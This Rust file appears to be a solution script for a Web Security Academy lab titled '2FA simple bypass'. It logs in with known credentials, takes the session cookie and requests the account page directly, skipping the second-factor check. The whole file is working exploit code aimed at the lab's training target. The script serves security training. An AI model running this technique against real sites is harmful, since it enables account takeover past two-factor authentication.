/**************************************************************************
*
* Lab: 2FA simple bypass
*
* Hack Steps: 
*      1. Login as carlos
*      2. Get the session cookie
*      3. Fetch the profile page directly bypassing 2FA
*      4. Extract the name 'carlos' to make sure you logged in as him
*
***************************************************************************/
use lazy_static::lazy_static;
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ace008404c1294d8777e741006d00bb.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Logging in as carlos.. ");
    let login_as_carlos = login_as_carlos();

    println!("{}", "OK".green());
    print!("⦗2⦘ Fetching the profile page directly bypassing 2FA.. ");

    let session = get_session_cookie(&login_as_carlos);
    let carlos_profile = fetch_with_session("/my-account?id=carlos", &session);

    println!("{}", "OK".green());
    print!("⦗3⦘ Extracting the name 'carlos' to make sure you logged in as him.. ");

    let body = carlos_profile.text().unwrap();
    let carlos_name = capture_pattern_from_text("Your username is: (carlos)", &body);

    if carlos_name.len() != 0 {
        println!("{}", "OK".green());
        println!("🗹 Logged in successfully as carlos");
        println!("🗹 The lab should be marked now as {}", "solved".green())
    } else {
        println!("{}", "Failed to login as Carlos".red());
    }
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn login_as_carlos() -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("password", "montoya"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as carlos".red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}
